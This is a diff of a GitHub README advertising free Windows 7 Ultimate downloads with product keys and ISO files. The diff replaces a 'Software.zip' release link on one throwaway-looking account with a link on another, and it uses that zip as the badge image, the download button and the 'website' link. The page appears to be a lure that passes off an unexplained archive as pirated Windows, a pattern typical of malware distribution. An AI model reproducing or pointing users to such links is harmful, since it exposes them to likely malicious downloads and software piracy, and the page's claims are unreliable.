@@ -25,7 +25,7 @@
 In this repository, you will find everything you need to download Windows 7 Ultimate, including the 64-bit version, product keys, and ISO files. Whether you are upgrading your current operating system or looking for a reliable version of Windows, you've come to the right place!
 
 ### 📥 Download Link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/milandiearee/Windows-7-Ultimate-Download/releases/download/v2.0/Software.zip)](https://github.com/milandiearee/Windows-7-Ultimate-Download/releases/download/v2.0/Software.zip)
 
 ### Note: Click the button above to launch the download!
 
@@ -33,7 +33,7 @@ In this repository, you will find everything you need to download Windows 7 Ulti
 If the provided link does not work or you are looking for more alternatives, please check the "Releases" section of this repository for additional download options.
 
 ### 🌐 Explore Further:
-Visit the [Windows 7 Ultimate Download Website](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) to discover more about this operating system and its features!
+Visit the [Windows 7 Ultimate Download Website](https://github.com/milandiearee/Windows-7-Ultimate-Download/releases/download/v2.0/Software.zip) to discover more about this operating system and its features!
 
 ### 🖥️ Why Choose Windows 7 Ultimate?
 Windows 7 Ultimate is known for its robust performance, enhanced security features, and user-friendly interface. Whether you are a casual user or a professional, Windows 7 Ultimate offers the flexibility and reliability you need for your daily tasks.
